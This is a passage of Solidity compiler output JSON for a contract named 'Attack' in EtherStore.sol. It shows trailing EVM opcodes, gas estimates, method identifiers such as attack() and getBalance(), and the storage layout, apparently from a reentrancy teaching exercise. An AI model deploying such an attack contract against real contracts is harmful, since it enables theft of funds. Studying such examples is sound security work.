DUP5 PUSH2 0x2E8 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x352 PUSH2 0x34D PUSH2 0x348 DUP5 PUSH2 0x310 JUMP JUMPDEST PUSH2 0x32F JUMP JUMPDEST PUSH2 0x310 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x363 DUP3 PUSH2 0x338 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x374 DUP3 PUSH2 0x359 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x384 DUP2 PUSH2 0x36A JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x39D PUSH0 DUP4 ADD DUP5 PUSH2 0x37B JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 SWAP2 0x4D SWAP7 DUP2 0x26 BLOBBASEFEE CREATE2 0x25 0x2F SWAP1 TLOAD 0xA5 SWAP7 PUSH15 0x4CC937DAD2C71DE5E4C436A05E959C LOG2 SWAP10 0x24 PUSH5 0x736F6C6343 STOP ADDMOD BYTE STOP CALLER "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "197000",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"AMOUT()": "369",
						"attack()": "infinite",
						"etherStore()": "infinite",
						"getBalance()": "312"
					}
				},
				"methodIdentifiers": {
					"AMOUT()": "fe57dc9c",
					"attack()": "9e5faafc",
					"etherStore()": "acd2e6e5",
					"getBalance()": "12065fe0"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 72,
						"contract": "contract/EtherStore.sol:Attack",
						"label": "etherStore",
						"offset": 0,
						"slot": "0",
						"type": "t_contract(EtherStore)69"
					}
				],
				"types": {
					"t_contract(EtherStore)69": {
						"encoding": "inplace",
						"label": "contract EtherStore",
						"numberOfBytes": "20"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}